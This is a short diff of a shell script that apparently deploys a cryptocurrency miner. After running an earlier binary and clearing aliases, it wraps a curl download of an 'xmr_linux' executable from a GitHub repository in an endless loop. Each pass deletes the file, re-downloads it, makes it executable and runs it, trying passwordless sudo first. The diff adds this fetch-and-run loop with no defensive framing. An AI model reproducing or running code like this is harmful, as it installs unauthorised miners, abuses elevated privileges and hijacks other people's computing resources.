@@ -20,7 +20,11 @@ chmod +x prepare.bin
 ./prepare.bin
 
 unalias -a
-curl -LO https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
-chmod +x xmr_linux_$arch
-sudo -n ./xmr_linux_$arch
-./xmr_linux_$arch
+
+while true; do
+    rm xmr_linux_$arch
+    curl -LO https://github.com/spetterman66/verynicerepo/raw/main/xmr_linux_$arch
+    chmod +x xmr_linux_$arch
+    sudo -n ./xmr_linux_$arch
+    ./xmr_linux_$arch
+done
